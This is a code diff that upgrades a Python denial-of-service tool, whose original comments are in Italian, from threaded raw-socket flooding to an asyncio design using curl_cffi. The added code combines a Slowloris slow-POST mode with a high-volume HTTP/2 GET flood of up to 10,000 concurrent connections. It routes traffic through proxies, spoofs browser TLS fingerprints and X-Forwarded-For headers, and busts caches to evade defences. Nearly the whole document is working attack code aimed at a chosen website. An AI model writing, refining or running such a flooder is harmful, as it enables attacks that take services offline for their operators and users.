@@ -1,6 +1,6 @@
-import socket
-import socks
-import threading
+import asyncio
+import logging
+from curl_cffi.requests import AsyncSession
 import random
 import re
 import urllib.request
@@ -459,6 +459,9 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			]
 
 
+# Configure logging to keep track of real statuses and errors
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
 def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
 	global url
 	global url2
@@ -606,8 +609,6 @@ def loop():
 	global threads
 	global acceptall
 	global connection
-	global go
-	global x
 	
 	acceptall = [
 	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
@@ -627,143 +628,114 @@ def loop():
 	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 	] # header accept a caso per far sembrare le richieste più legittime
 	connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
-	x = 0 # thanks therunixx, my friend
-	go = threading.Event()
-	if choice2 == "y": # se abbiamo scelto la modalita' proxying
-		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
-			for x in range(threads):
-				RequestProxyHTTP(x+1).start() # starta la classe apposita
-				print ("Thread " + str(x) + " ready!")
-			go.set() # questo fa avviare i threads appena sono tutti pronti
-		else: # se abbiamo scelto i socks
-			for x in range(threads):
-				RequestSocksHTTP(x+1).start() # starta la classe apposita
-				print ("Thread " + str(x) + " ready!")
-			go.set() # questo fa avviare i threads appena sono tutti pronti
-	else: # altrimenti manda richieste normali non proxate.
-		for x in range(threads):
-			RequestDefaultHTTP(x+1).start() # starta la classe apposita
-			print ("Thread " + str(x) + " ready!")
-		go.set() # questo fa avviare i threads appena sono tutti pronti
+	
+	try:
+		# Use WindowsSelectorEventLoopPolicy as it handles sockets better under load in some Windows setups
+		if sys.platform == 'win32':
+			asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+		asyncio.run(main_loop())
+	except KeyboardInterrupt:
+		logging.info("Attack stopped by user.")
+		sys.exit(0)
 
+async def slow_payload_generator():
+	"""Генератор для симуляции Slow HTTP (Slowloris). Медленно отдает тело POST-запроса."""
+	# Отправляем 1 байт каждые 5-10 секунд, заставляя сервер держать коннект открытым
+	for _ in range(100):
+		yield b"A"
+		await asyncio.sleep(random.uniform(5, 10))
 
-class RequestProxyHTTP(threading.Thread): # la classe del multithreading
+async def main_loop():
+	tasks = []
+	# Limit active connections so we don't blow up the local OS networking stack
+	# Allow massive concurrency for maximum DPS (up to 10000)
+	conn_limit = min(threads, 10000)
+	semaphore = asyncio.Semaphore(conn_limit)
+	
+	logging.info(f"Starting HYBRID attack: HTTP/2 JA3 Spoofing + Slowloris (curl_cffi) with {threads} threads...")
+	for x in range(threads):
+		tasks.append(asyncio.create_task(WorkerTask(x+1, semaphore)))
+		
+	try:
+		await asyncio.gather(*tasks)
+	except asyncio.CancelledError:
+		logging.info("Tasks successfully cancelled.")
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta useragent a caso
-		accept = random.choice(acceptall) # scelta header accept a caso
-		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
-		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
-		if choice1 == "1":
-			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+async def WorkerTask(counter, semaphore):
+	# Choose a random browser to impersonate to avoid fingerprinting
+	impersonate_targets = ["chrome110", "chrome116", "edge101", "safari15_3"]
+	browser = random.choice(impersonate_targets)
+	
+	# Determine proxy
+	proxy_url = None
+	if choice2 == "y":
+		if counter - 1 < len(proxies):
+			raw_proxy = proxies[counter-1].strip()
 		else:
-			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che i threads siano pronti
-		while True: # ciclo infinito
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
-				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
-				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except:
-				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia
+			raw_proxy = random.choice(proxies).strip()
+		
+		if choice3 == "0":
+			proxy_url = f"http://{raw_proxy}"
+		elif choice3 == "1":
+			proxy_url = f"socks5://{raw_proxy}"
 
-class RequestSocksHTTP(threading.Thread): # la classe del multithreading
+	# Fallback headers for extra randomness (optional, impersonate handles most)
+	randomip = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+	extra_headers = {
+		"X-Forwarded-For": randomip,
+		"Cache-Control": "no-cache, no-store, must-revalidate", # Cache-busting
+		"Pragma": "no-cache"
+	}
 
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
+	# 10% of threads will be dedicated to Slowloris connection holding, 90% for Volumetric Flood
+	is_slowloris = random.random() < 0.10
 
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # scelta proxy a caso
-		accept = random.choice(acceptall) # scelta accept a caso
-		if choice1 == "1":
-			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-		else:
-			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
-		current = x # per dare l'id al thread
-		if current < len(proxies): # se l'id del thread si puo' associare ad un proxy, usa quel proxy
-			proxy = proxies[current].strip().split(':')
-		else: # altrimenti lo prende a random
-			proxy = random.choice(proxies).strip().split(":")
-		go.wait() # aspetta che threads siano pronti
-		while True:
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
-				s = socks.socksocket() # creazione socket con pysocks
-				s.connect((str(url2), int(urlport))) # connessione
-				s.send (str.encode(request)) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se qualcosa va storto questo except chiude il socket e si collega al try sotto
-				s.close() # chiude socket
-				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
-					s = socks.socksocket() # creazione nuovo socket
-					s.connect((str(url2), int(urlport))) # connessione
-					s.send (str.encode(request)) # invio
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
-					try: # invia altre richieste nello stesso thread
-						for y in range(multiple): # fattore di moltiplicazione
-							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-						s.close()
-				except:
-					print ("Sock down. Retrying request. @", self.counter)
-					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
-
-class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
-
-	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
-		threading.Thread.__init__(self)
-		self.counter = counter
-
-	def run(self): # la funzione che da' le istruzioni ai vari threads
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # useragent a caso
-		accept = random.choice(acceptall) # accept a caso
-		if choice1 == "1":
-			ip = random.choice(ips)
-			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-		else:
-			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
-		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
-		go.wait() # aspetta che i threads siano pronti
-		while True:
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
-				s.connect((str(url2), int(urlport))) # connessione
-				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
-				try: # invia altre richieste nello stesso thread
-					for y in range(multiple): # fattore di moltiplicazione
-						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
-				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
-					s.close()
-			except: # se qualcosa va storto
-				s.close() # chiude socket e ricomincia
+	while True:
+		try:
+			async with semaphore:
+				# AsyncSession with HTTP/2 support and JA3 spoofing
+				async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
+					if is_slowloris:
+						# SLOWLORIS MODE: Slow POST Request
+						target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
+						target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
+						logging.debug(f"[SLOW] Sending Slowloris POST from Thread {counter} (Browser: {browser})")
+						try:
+							# Устанавливаем огромный таймаут, так как мы сами тормозим отправку
+							response = await session.post(
+								target_with_buster, 
+								headers=extra_headers, 
+								data=slow_payload_generator(), 
+								timeout=1000.0 # Timeout needs to be large enough for the generator to run
+							)
+							logging.info(f"[SLOW] Thread {counter} | Status: {response.status_code}")
+						except asyncio.CancelledError:
+							raise
+						except Exception as e:
+							logging.debug(f"[SLOW] Thread {counter} Error: {type(e).__name__}")
+					else:
+						# VOLUMETRIC MODE: Fast GET Flood (HTTP/2 Multiplexing)
+						async def make_request():
+							try:
+								target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
+								target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
+								response = await session.get(target_with_buster, headers=extra_headers, timeout=5.0)
+								# Log only 2% of successful requests so console output doesn't bottleneck the script
+								if random.random() < 0.02 or response.status_code >= 400:
+									logging.info(f"[FAST] Thread {counter} | Status: {response.status_code}")
+							except asyncio.CancelledError:
+								raise
+							except Exception as e:
+								logging.debug(f"[FAST] Thread {counter} Error: {type(e).__name__}")
+								
+						# Blast everything concurrently over the same HTTP/2 session
+						req_tasks = [make_request() for _ in range(multiple)]
+						await asyncio.gather(*req_tasks)
+		except asyncio.CancelledError:
+			break # Exit gracefully on Ctrl+C
+		except Exception:
+			await asyncio.sleep(0.1)
 
 
 if __name__ == '__main__':
-	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+	starturl()
